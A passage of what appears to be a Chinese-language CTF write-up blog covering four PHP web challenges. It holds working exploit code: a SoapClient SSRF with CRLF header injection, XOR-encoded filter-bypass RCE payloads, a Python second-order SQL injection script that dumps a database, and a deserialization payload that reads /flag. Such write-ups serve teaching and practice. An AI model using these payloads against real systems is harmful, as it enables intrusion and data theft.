class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>&#125;<br>var_dump(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(reset(<span class="hljs-variable">$_SESSION</span>), <span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);<br>call_user_func(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">only localhost can <span class="hljs-builtin-name">get</span> flag!session_start(); echo <span class="hljs-string">&#x27;only localhost can get flag!&#x27;</span>; <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>; <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] = <span class="hljs-variable">$flag</span>; &#125; only localhost can <span class="hljs-builtin-name">get</span> flag!<br></code></pre></td></tr></table></figure><p>​    这里 $_SERVER[“REMOTE_ADDR”]&#x3D;&#x3D;&#x3D;”127.0.0.1” 暗示了要用Soap原生类来解决</p><p>这里还需要提一下PHP使用不同引擎可能会造成反序列化问题</p><table><thead><tr><th>php_serialize</th><th>经过serialize()函数序列化数组</th></tr></thead><tbody><tr><td>php</td><td>键名+竖线+经过serialize()函数处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的ascii字符+键名+serialize()函数序列化的值</td></tr></tbody></table><p>demo:</p><p>php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br>    session_start();<br><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-comment">//name|s:4:&quot;test&quot;;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>php_serialize</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>    session_start();<br><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-comment">//a:1:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>php_binary</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_binary&#x27;</span>);<br>    session_start();<br><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-comment">//&lt;0x04&gt;names:4:&quot;test&quot;;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果session内容可控 让它变为 <code>|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;</code></p><p>序列化引擎使用的是php_serialize，那么储存的session文件为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">a:<span class="hljs-number">1</span>:&#123;<span class="hljs-attr">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;|O:5:&quot;</span>Smi1e<span class="hljs-string">&quot;:1:&#123;s:4:&quot;</span>test<span class="hljs-string">&quot;;s:3:&quot;</span>AAA<span class="hljs-string">&quot;;&#125;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>而反序列化引擎如果使用的是php，就会把<code>|</code>作为作为key和value的分隔符。把<code>a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;</code>当作键名，而把<code>O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;</code>当作经过serialize()函数处理过的值，最后会把它进行unserialize处理，此时就构成了一次反序列化注入攻击。</p><p>那怎么替换他的引擎？这里</p><p>​    思路是这样：改session引擎成php_serliaze &#x3D;&gt; Soapclient </p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<br>    <span class="hljs-keyword">array</span>(<br><br>        <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;test\r\nCookie:PHPSESSID=11111111111111111111111111&quot;</span>,<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&#x27;test&#x27;</span>,<br>        <span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&#x27;http://127.0.0.1/flag.php&#x27;</span><br>    )<br>);<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;|&quot;</span> . urlencode(<span class="hljs-variable">$b</span>);<br><br><br></code></pre></td></tr></table></figure><p>改引擎传入soap的序列化内容</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202051850090.png" alt="image-20220205185044964"></p><p>这里构造的目的是</p><p><code>session_start</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202051851566.png" alt="image-20220205185122442"></p><p>这一步，构造</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">call<span class="hljs-constructor">_user_func(<span class="hljs-params">extract</span>(<span class="hljs-params">b</span>=<span class="hljs-params">call_user_func</span>)</span>)<br>call<span class="hljs-constructor">_user_func(<span class="hljs-params">call_user_func</span>,<span class="hljs-params">array</span>($<span class="hljs-params">_session</span>,‘<span class="hljs-params">welcome_to_the_lctf2018</span>)</span>)<br>然后call_user_func发现自己接受到一个数组就会去找 $session这个的对象的 &#x27;welcome_to_the_lctf2018&#x27; 这个方法 于是调用到 _call方法度 Soapclinet去访问flag.php<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202051855445.png" alt="image-20220205185523333"></p><h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><p>无字母rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$_</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><span class="hljs-keyword">if</span> ( preg_match(<span class="hljs-string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="hljs-variable">$_</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;rosé will not do it&#x27;</span>);<br><span class="hljs-comment">//使用的不重复字符串&lt;=13</span><br><span class="hljs-keyword">if</span> ( strlen(count_chars(strtolower(<span class="hljs-variable">$_</span>), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;you are so close, omg&#x27;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先看看phpinfo 这里可以url编码取反绕过</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">php &gt; var_dump(urlencode(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>));<br>string(<span class="hljs-number">21</span>) <span class="hljs-string">&quot;%8F%97%8F%96%91%99%90&quot;</span><br></code></pre></td></tr></table></figure><p>然后用括号包起来 <code>?_=(~%8F%97%8F%96%91%99%90)();</code></p><p>phpinfo显示禁用了如下函数</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,<span class="hljs-keyword">system</span>,<span class="hljs-built_in">exec</span>,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open<br></code></pre></td></tr></table></figure><p>然后扫描一下目录</p><p>可以通过 print_r(scandir(.)) 来 但是 这样不同字符串的长度超过13 ，然后就需要减长度，那可以让 相同的字母取不同的字符异或</p><p>有脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">string=<span class="hljs-string">&#x27;.prints()and;&#x27;</span><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> string:<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> string:<br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> string:<br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> string:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(a)^<span class="hljs-built_in">ord</span>(b)^<span class="hljs-built_in">ord</span>(c)==<span class="hljs-built_in">ord</span>(m):<br>                    <span class="hljs-keyword">if</span> a==b==c:<br>                        <span class="hljs-keyword">continue</span><br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-built_in">print</span>(a+<span class="hljs-string">&#x27;=&#x27;</span>+(a)+<span class="hljs-string">&#x27;^&#x27;</span>+(b)+<span class="hljs-string">&#x27;^&#x27;</span>+(c))<br></code></pre></td></tr></table></figure><p>回头看这条语句 print_r(scandir(.))</p><p>假设去掉  rnt  找上面脚本的输出结果</p><figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs parser3"><span class="xml">t = s</span><span class="hljs-keyword">^c</span><span class="hljs-keyword">^d</span><span class="xml"> 也就是 s</span><span class="hljs-keyword">^0xff</span><span class="xml">   c</span><span class="hljs-keyword">^0xff</span><span class="xml">   d</span><span class="hljs-keyword">^0xff</span><span class="xml"> </span><br><span class="xml">n = i</span><span class="hljs-keyword">^c</span><span class="hljs-keyword">^d</span><span class="xml"> 同理</span><br><span class="xml">r = a</span><span class="hljs-keyword">^c</span><span class="hljs-keyword">^p</span><br></code></pre></td></tr></table></figure><p>然后我们对原先的字符串进行替换</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">print_r(scandir(.))<br>print_r 有三部分组成的异或等式 先直接替换 (tnr<span class="hljs-operator">=</span>&gt;sia) 然后剩下两组相互异或 (<span class="hljs-keyword">ccc</span>^ddp) 见上脚本结果<br>paiis_a <span class="hljs-operator">=</span>&gt;(<span class="hljs-variable">%8</span>F<span class="hljs-variable">%9</span>E<span class="hljs-variable">%96</span><span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>C<span class="hljs-variable">%A0</span><span class="hljs-variable">%9</span>E)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)<br><span class="hljs-keyword">ccc</span>^ddd(找替换的字符的位置再进行替换)<span class="hljs-operator">=</span>&gt;(<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f)<br>print_r<span class="hljs-operator">=</span>&gt;paiis_a ^(<span class="hljs-keyword">ccc</span>^ddd) <span class="hljs-operator">=</span>&gt;<br>((<span class="hljs-variable">%8</span>f<span class="hljs-variable">%9</span>e<span class="hljs-variable">%96</span><span class="hljs-variable">%96</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%9</span>e)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f))<br>scandir()<span class="hljs-operator">=</span>&gt; 同理<br>((<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%96</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%96</span><span class="hljs-variable">%9</span>e)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f))<br></code></pre></td></tr></table></figure><p>综合 </p><p><code>?_=((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))(((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))((%d1)^(%ff)));</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202052355031.png" alt="image-20220205235557912"></p><p>找到文件名，这个时候发现文件名很长，可以借助php对数组的操作 end() 将指针指向最后一个单元</p><p>于是目的变为 <code>show_source(end(scandir(.)));</code></p><p>最终payload</p><p><code>?_=((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</code></p><h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>这居然是sql注入 hhh</p><p>借用一下赵总的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> requests<br><br>target = <span class="hljs-string">&quot;http://node4.buuoj.cn:28893/&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">execute_sql</span>(<span class="hljs-params">sql</span>):</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]请求语句：&quot;</span> + sql)<br>    return_result = <span class="hljs-string">&quot;&quot;</span><br><br>    payload = <span class="hljs-string">&quot;0&#x27;|length((&quot;</span> + sql + <span class="hljs-string">&quot;))|&#x27;0&quot;</span><br>    session = requests.session()<br>    r = session.get(target, headers=&#123;<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: payload&#125;)<br>    r = session.get(target, headers=&#123;<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: <span class="hljs-string">&#x27;glzjin&#x27;</span>&#125;)<br>    r = session.get(target, headers=&#123;<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: <span class="hljs-string">&#x27;glzjin&#x27;</span>&#125;)<br>    start_pos = r.text.find(<span class="hljs-string">&quot;Last Ip: &quot;</span>)<br>    end_pos = r.text.find(<span class="hljs-string">&quot; --&gt;&quot;</span>, start_pos)<br>    length = <span class="hljs-built_in">int</span>(r.text[start_pos + <span class="hljs-number">9</span>: end_pos])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]长度：&quot;</span> + <span class="hljs-built_in">str</span>(length))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length + <span class="hljs-number">1</span>, <span class="hljs-number">5</span>):<br>        payload = <span class="hljs-string">&quot;0&#x27;|conv(hex(substr((&quot;</span> + sql + <span class="hljs-string">&quot;),&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;,5)),16,10)|&#x27;0&quot;</span><br><br>        r = session.get(target, headers=&#123;<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: payload&#125;) <span class="hljs-comment"># 将语句注入</span><br>        r = session.get(target, headers=&#123;<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: <span class="hljs-string">&#x27;glzjin&#x27;</span>&#125;)    <span class="hljs-comment"># 查询上次IP时触发二次注入</span><br>        r = session.get(target, headers=&#123;<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: <span class="hljs-string">&#x27;glzjin&#x27;</span>&#125;)    <span class="hljs-comment"># 再次查询得到结果</span><br>        start_pos = r.text.find(<span class="hljs-string">&quot;Last Ip: &quot;</span>)<br>        end_pos = r.text.find(<span class="hljs-string">&quot; --&gt;&quot;</span>, start_pos)<br>        result = <span class="hljs-built_in">int</span>(r.text[start_pos + <span class="hljs-number">9</span>: end_pos])<br>        return_result += <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(result)[<span class="hljs-number">2</span>:]).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]位置 &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot; 请求五位成功:&quot;</span> + <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(result)[<span class="hljs-number">2</span>:]).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>    <span class="hljs-keyword">return</span> return_result<br><br><br><span class="hljs-comment"># 获取数据库</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]获取成功：&quot;</span> + execute_sql(<span class="hljs-string">&quot;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&quot;</span>))<br><br><span class="hljs-comment"># 获取数据库表</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]获取成功：&quot;</span> + execute_sql(<span class="hljs-string">&quot;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &#x27;F4l9_D4t4B45e&#x27;&quot;</span>))<br><br><span class="hljs-comment"># 获取数据库表</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]获取成功：&quot;</span> + execute_sql(<span class="hljs-string">&quot;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &#x27;F4l9_D4t4B45e&#x27; AND TABLE_NAME = &#x27;F4l9_t4b1e&#x27; &quot;</span>))<br><br><span class="hljs-comment"># 获取表中内容</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]获取成功：&quot;</span> + execute_sql(<span class="hljs-string">&quot;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&quot;</span>))<br><br></code></pre></td></tr></table></figure><h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>好久没看到这种信息泄露了</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202061021338.png" alt="image-20220206102059166"></p><p>github可以找到源码</p><p>在show.php  发现反序列化函数</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202061038161.png" alt="image-20220206103848072"></p><p>在helper.php发现序列化函数</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202061040606.png" alt="image-20220206104029523"></p><p>这里upload.php实际调用 upload函数，将图片长宽序列化存入数据库中</p><p>然后我在helper.php中还发现了文件读取函数</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202061101116.png" alt="image-20220206110122053"></p><p>​     几个成员属性可控，而且helper析构函数自动调用 view_files</p><p>于是有exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = <span class="hljs-literal">True</span>; <br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;/flag&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=serialize(<span class="hljs-keyword">new</span> helper());<br><span class="hljs-variable">$result</span>=str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;/flag&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>这里上传的内容已经搞出来了</p><p>但是由于上传内容中不能含有双引号 所以这里还要进一步处理</p><p><code>O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;/flag&quot;;&#125;</code> &#x3D;&gt;</p><p><code>0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</code></p><p>这个16进制全编码推荐hackbar</p><p>可以发现helper.php中存在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$basename</span> = substr(md5(time().uniqid()),<span class="hljs-number">9</span>,<span class="hljs-number">16</span>);<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;name&quot;</span>];<br><span class="hljs-variable">$ext</span> = substr(strrchr(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);<br><span class="hljs-variable">$cate_exts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>);<br><span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$cate_exts</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);<br>&#125;<br>    <span class="hljs-variable">$title</span> = str_replace(<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$filename</span>);<br>    <span 